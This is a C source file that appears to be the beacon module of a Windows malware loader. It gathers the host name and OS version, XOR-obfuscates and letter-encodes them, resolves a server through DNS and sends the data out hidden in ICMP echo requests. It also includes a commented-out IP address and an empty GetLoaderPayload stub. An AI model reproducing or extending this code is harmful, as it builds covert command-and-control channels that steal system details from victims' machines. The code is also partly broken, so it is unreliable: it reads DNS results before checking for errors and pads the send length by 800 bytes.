#define _WIN32_INNT 0x0600
#include "log.h"
#include "ping.h"
#include <windows.h>
#include <windns.h>
#include <stdio.h>
#define NADDR(a,b,c,d) ((a)|(b)<<8|(c)<<16|(d)<<24)



static DWORD GetOSIdentifier(void) {
	typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);

	OSVERSIONINFOEX			os;
    LPFN_ISWOW64PROCESS		fnIsWow64Process;
	DWORD					dwIdentifier;
    BOOL					bIsWow64 = FALSE;

    fnIsWow64Process = (LPFN_ISWOW64PROCESS)
		GetProcAddress( GetModuleHandleW((L"kernel32")), "IsWow64Process");

    if (NULL != fnIsWow64Process)
        fnIsWow64Process(GetCurrentProcess(),&bIsWow64);

	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);     

    if(0 == GetVersionEx((OSVERSIONINFO *)&os))  
    {
		Log("GetVersionEx error %d\n",GetLastError());
		return 0;
	}

	dwIdentifier = os.dwMajorVersion<<24 | os.dwMinorVersion<<16 | os.dwBuildNumber;
	if(bIsWow64)
		dwIdentifier |= 1<<31;
	return dwIdentifier;
}



static inline DWORD SendEcho(DWORD dwAddr, LPVOID pRequestData, DWORD dwRequestDataSize, //over flow in this procedure
	   LPBYTE pReplyData, DWORD dwReplyDataSize) { 
	HANDLE				hIcmpFile = NULL;
    DWORD				dwRetVal = 0;
    DWORD				dwError = 1;
	//PHOSTENT			remoteHost;
    BYTE				cReplyBuffer[1024] = {0};
	PICMP_ECHO_REPLY	pEchoReply;
	HMODULE hIphlpapi ;

	PFN_IcmpCreateFile	pfnIcmpCreateFile;
	PFN_IcmpSendEcho2	pfnIcmpSendEcho2;
	PFN_IcmpCloseHandle	pfnIcmpCloseHandle;

	hIphlpapi = LoadLibraryA("icmp.dll");
	if(hIphlpapi == 0) {
		Log("LoadLibraryA error: %d\n",GetLastError()); 
		return 1;
	}

	pfnIcmpCreateFile =		(PFN_IcmpCreateFile)GetProcAddress(hIphlpapi,"IcmpCreateFile");
	pfnIcmpSendEcho2 =		(PFN_IcmpSendEcho2)GetProcAddress(hIphlpapi,"IcmpSendEcho2");
	pfnIcmpCloseHandle =	(PFN_IcmpCloseHandle)GetProcAddress(hIphlpapi,"IcmpCloseHandle");

	if(pfnIcmpCreateFile == NULL || pfnIcmpSendEcho2 == NULL || pfnIcmpCloseHandle == NULL)
		goto CLEAN;

	//ipaddr = NADDR(118,184,53,36);

    hIcmpFile = pfnIcmpCreateFile();

    if (hIcmpFile == INVALID_HANDLE_VALUE) {
        Log("IcmpCreatefile error: %ld\n", GetLastError());
		goto CLEAN;
    }
	

    dwRetVal = pfnIcmpSendEcho2(
			hIcmpFile,
			NULL,
			NULL,
			NULL,
            dwAddr,
			pRequestData,
			(WORD)dwRequestDataSize+800, 
			NULL,
			cReplyBuffer,
			sizeof(cReplyBuffer),
			2000
			);

	if (dwRetVal == 0) {
		DWORD dwErr = GetLastError();
		if(dwErr == IP_REQ_TIMED_OUT) 
			Log("IcmpSendEcho2 timeout\n");
		else {
			Log("IcmpSendEcho2 error: %d\n",dwErr);
			goto CLEAN;
		}
		
	}

	Log("IcmpSendEcho ret %d\n", dwRetVal);
    pEchoReply = (PICMP_ECHO_REPLY) cReplyBuffer;

    if (pEchoReply->Status == 0) {
		//(dwReplyDataSize);//buffer limit size not used
		//CopyMemory(pReplyData,pEchoReply->Data,pEchoReply->DataSize); //Stack over flow in here
		if(dwReplyDataSize < pEchoReply->DataSize) {
			Log("error: Reply buffer too small\n");
			goto CLEAN;
		}
		CopyMemory(pReplyData,pEchoReply->Data,pEchoReply->DataSize);
	} else {
		Log("status code: %d\n",pEchoReply->Status);
		Log("data %s\n", pEchoReply->Data);
		goto CLEAN;
	}
	
	dwError = 0;
	
CLEAN:
	if(hIcmpFile) pfnIcmpCloseHandle(hIcmpFile);
	if(hIphlpapi) FreeLibrary(hIphlpapi);

	return dwError;
}

static int GetARecord(LPCSTR lpDomain, LPDWORD lpAddr) {
	PDNS_RECORD pRecord;
	DNS_A_DATA aRecord;

	DNS_STATUS ret = DnsQuery_A(lpDomain, DNS_TYPE_A, DNS_QUERY_STANDARD, NULL, &pRecord, NULL);
	aRecord = pRecord->Data.A;

	if(ret != ERROR_SUCCESS)
		return 1;

	*lpAddr = aRecord.IpAddress;

	return 0;
}

int SendSystemInfo(LPCSTR szHost, LPBYTE lpReply, DWORD dwSize) {
#pragma pack(1)
	typedef struct heartbeat {
		BYTE bSalt;
		BYTE bMark;
		DWORD dwOSIdentifier;
		CHAR sHostName[10];//gbk,because of dense
	}HEARTBEAT;
#pragma pack()


	DWORD				dwAddr = 0;
	HEARTBEAT			hb;
	BYTE				cSendBuffer[sizeof(hb)*2];
	CHAR				szHostName[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD				dwNameSize = sizeof(szHostName);
	int					i;

	BYTE bRand = (BYTE)GetTickCount();
	
	GetComputerNameA(szHostName,&dwNameSize);
	
	hb.bSalt = bRand;
	hb.bMark = 0xEA;
	hb.dwOSIdentifier = GetOSIdentifier();
	memcpy(hb.sHostName, szHostName, sizeof(hb.sHostName));

	//printf("bRand = %hhx\n",bRand);
	for (i=0; i<sizeof(hb); i++) {
		BYTE by;
		if(i>0)		
			by = ((LPBYTE)&hb)[i] ^ bRand;
		else
			by = ((LPBYTE)&hb)[i];
		cSendBuffer[i*2] = 'a' + (by>>4);
		cSendBuffer[i*2+1] = 'k' + (by&0x0F);
	}
	
	GetARecord(szHost, &dwAddr);

	return SendEcho(dwAddr, cSendBuffer, sizeof(cSendBuffer), lpReply, dwSize);
}

int GetLoaderPayload(DWORD dwAddr) {

}

